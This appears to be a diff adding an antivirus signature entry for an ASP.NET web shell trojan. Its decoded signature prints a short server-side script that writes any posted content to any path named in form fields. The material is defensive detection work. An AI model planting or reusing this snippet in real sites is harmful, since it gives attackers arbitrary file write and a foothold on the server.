@@ -1,0 +1,5 @@
+VIRUS NAME: Asp.Trojan.Webshell0321-9839392-0
+TARGET TYPE: HTML
+OFFSET: 0
+DECODED SIGNATURE:
+<script runat="server">protectedvoidpage_load(objectsender,eventargse){(system.io.streamwritersw=newsystem.io.streamwriter(request.form["fpm_admin"],false,encoding.default);sw.write(request.form["frm_admin"]);sw.close();}</script>
